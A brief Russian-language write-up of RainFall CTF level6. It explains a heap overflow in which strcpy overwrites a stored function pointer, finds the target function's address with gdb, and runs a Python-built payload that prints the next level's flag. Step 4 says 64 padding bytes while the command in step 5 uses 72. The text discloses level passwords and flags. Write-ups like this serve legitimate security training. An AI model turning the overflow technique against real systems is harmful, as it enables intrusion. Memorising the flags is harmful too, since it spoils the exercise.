1. Логинимся level6:d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
2. Investигируем. Программа берёт argv и говорит Nope.
main имеет внутри два mallocа, а затем strcpy. Первый малок аллоцирует 64 байта, второй 4 и сохраняет поинтер для следующей функции m. strcpy копирует ввод из argv[1] и сохраняет в переменной с первым malloc, дальше функция m посылает нам "Nope". Но адрес этой функции кладётся дальше по памяти, после введённой строки.

strcpy не защищает против buffer overflow attack и мы можем в конце вписать нашу функцию для ввода

3. Найдём адрес n - 0x8048454
(gdb) p n
$1 = {<text variable, no debug info>} 0x8048454 <n>


4. Подготовим payload 
python -c 'print "A"* 64 + "\x54\x84\x04\x08"'

5. Запустим exploit
level6@RainFall:~$ ./level6 $(python -c 'print "A"* 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d